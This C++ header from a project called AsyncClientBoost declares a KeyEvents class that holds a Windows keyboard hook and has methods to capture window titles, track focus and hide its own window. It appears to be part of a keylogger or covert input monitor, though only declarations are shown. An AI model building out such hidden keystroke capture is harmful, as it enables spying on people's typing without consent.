//
//  KeyEvents.h
//  AsyncClientBoost
//
//  Created by Charles Fournier on 29/10/2014.
//  Copyright (c) 2014 Charles Fournier. All rights reserved.
//

#define __KEYEVENTS_H__

#include <string>
#include <ctime>
#include <cstdint>
#include "IObservable.h"

static HHOOK hook; // A ajouter dans la classe KeyEvents

class KeyEvents : public IObservable
{
private:
	bool _run;
	bool _hide;
	char *_focus;

public:
	KeyEvents();
	KeyEvents(IObserver *, bool hide);
	~KeyEvents();
	void		run();
	void		stop();
	char		*getWindowsTitle();
	void		hideWindow();
	char		*getFocus() const;
	void		setFocus(char *focus);
};